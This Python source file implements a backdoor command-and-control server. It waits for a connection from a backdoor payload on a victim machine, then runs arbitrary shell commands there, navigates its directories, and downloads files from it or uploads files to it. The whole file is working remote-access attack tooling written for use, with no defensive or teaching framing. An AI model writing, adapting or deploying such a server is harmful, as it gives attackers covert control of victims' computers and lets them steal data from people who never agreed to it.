"""
Backdoor Server
---------------
written by mr3w00d, 2022

The backdoor server listens for connection from a backdoor payload. 

When connected to a backdoor, the server will first check the connection by requesting the
current working directory for the backdoor. When response is recived, the connection is confirmed.

When connection is confirmed, the server can execute commands.

The server has three kinds of commands:
    - bdserver commands : local commands for bdserver only
    - shell commands    : commands executed in the target shell
    - app commands      : commands for the backdoor application

App and Shell commands are sendt as an encoded jsonString from the RequestData object
All requests require a response from backdoor. Responses are parsed as a ResponseData Object

"""

from modules.ResponseData import ResponseData
from modules.RequestData import RequestData
import socket, os


# Default settings for ip and port
DEFAULT_IP      = "192.168.0.16"
DEFAULT_PORT    = 5555
# debug setting
DEBUG           = True

# log data to console
def log_info(text):
    """ print info to terminal"""
    print("[*] {}".format(text))
def log_success(text):
    """ print success info to terminal"""
    print("[+] {}".format(text))
def log_failure(text):
    """log failure to terminal"""
    print("[-] {}".format(text))



class BackdoorServer:
    """
    Backdoor Server Class

    @param ip (string) : server ip
    @param port (int) : server port
    """

    def __init__(self, ip, port) -> None:

        # create adress for socet
        self._address = (ip, port)

        # create IPv4, tct socket and bind to adress
        self.__SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__SOCK.bind(self._address)

        self.__target     = None      # hold target socket
        self.__target_ip  = None      # hold target ip adress
        self.__target_cwd = None      # hold target current working directory


    def run(self):

        print("\n   ---   STARTING BACKDOOR SERVER =>  {}:{}   ---\n".format(self._address[0], self._address[1]))

        # listen for connection
        self.__SOCK.listen(5)
        log_info("Waiting for connection...")

        # accept connection from target
        self.__target, self.__target_ip = self.__SOCK.accept()
        log_info("Connecting {}".format(self.__target_ip))

        # check connection
        self.__first_connect()

        # communicate with target
        self.__target_comm()


    def disconnect_target(self):
        """ tell backdoor to disconnect from application """
        req = RequestData("app", "exit")
        self.__send(req)


    def __first_connect(self):
        """ test first connection by asking backdoor for current working directory """

        req = RequestData("app","getcwd")
        self.__send(req)

        res = self.__recive()
        self.__target_cwd = res.cwd
        log_success("Connected {}".format(self.__target_ip))


    def __target_comm(self):
        """ handles communication with target"""
        while True:
            cmd_string = " ~{}\n {}> ".format(self.__target_ip, self.__target_cwd)
            command = input(cmd_string)

            # handle exit backdoor
            if command[:4] in ['quit','exit']:
                self.disconnect_target()
                break

            # handle clear console
            if command == "clear":
                os.system("cls")
                continue

            # handle dir navigation
            if command[:2] == "cd":
                req = RequestData("app", command)
                self.__send(req)
                res = self.__recive()
                if res.err:
                    print(res.err)
                else:
                    self.__target_cwd = res.cwd
                continue
            
            # handle download command
            if command[:8] == "download":
                self.__download(command)
                continue

            # handle upload command
            if command[:6] == "upload":
                self.__upload(command)
                continue


            # handle local commands
            if command[:8] == "bdserver":
                if command == "bdserver help":
                    self.__print_help()
                    continue

                log_failure("\"{}\" is not a valid command. Try \"bdserver help\" for documentation")
                continue
            

            # handle other commands as shell commands
            req = RequestData("shell", command)
            self.__send(req)

            res = self.__recive()
            
            if res.out:
                print(res.out)
            if res.err:
                print(res.err)


    def __send(self, data) -> None:
        """ 
        Encode and sendt data 
        
        @param data (Request) : Request object for data transfer
        """

        encodedData = data.encode_data()
        self.__target.send(encodedData)
    

    def __recive(self) -> ResponseData:
        """
        Recive response from target and returns ResponseData object
        """

        data = ""
        while True:
            try:
                data += self.__target.recv(1024).decode().rstrip()
                res = ResponseData()
                res.parse_json(data)
                return res
            except ValueError:
                continue

    
    def __download(self, command):
        """
        Send download command to target and recives file.
        
        @param command (string) : download command
        """

        req = RequestData("app", command)
        file_name = command[9:]

        self.__send(req)

        res = self.__recive()

        if not res.out == "exist":
            log_failure(f"{file_name} does not exist in current directory")
            return

        with open(file_name, "wb") as file:
            self.__target.settimeout(1)
            chunk = self.__target.recv(1024)

            while chunk:

                print(chunk)
                file.write(chunk)
                try:
                    chunk = self.__target.recv(1024)
                except socket.timeout:
                    break
            
            self.__target.settimeout(None)
 

    def __upload(self, command):
        """
        Upload file from server to shell working directory 
        
        @param command (string) : command
        """
        
        file_name = command[7:]
        exist = os.path.exists(file_name)

        if not exist:
            log_failure(f"{file_name} does not exist in server selected folder...")
            return

        req = RequestData("app",command)
        self.__send(req)

        # and send file
        with open(file_name, "rb") as file:
            self.__target.send(file.read())


    def __print_help(self):
        """Print help text for application"""

        print("help")

        text = """

    Backdoor Server Help
    --------------------

    Use target os shell command to interact with target.
    Other target commands are listed below

    Target commands:
    ----------------------

    download .... : download file from shell working directory ( set file name )
    upload ...... : upload file to shell working directory     ( set file name )


    server commands
    ---------------

    bdserver help ........ : this help file

"""
        print(text)



if __name__ == "__main__":

    server = BackdoorServer(DEFAULT_IP, DEFAULT_PORT)

    if not DEBUG:
        try:
            server.run()
        except:
            log_failure("An error occured, server closed down...")
    else:
        server.run() 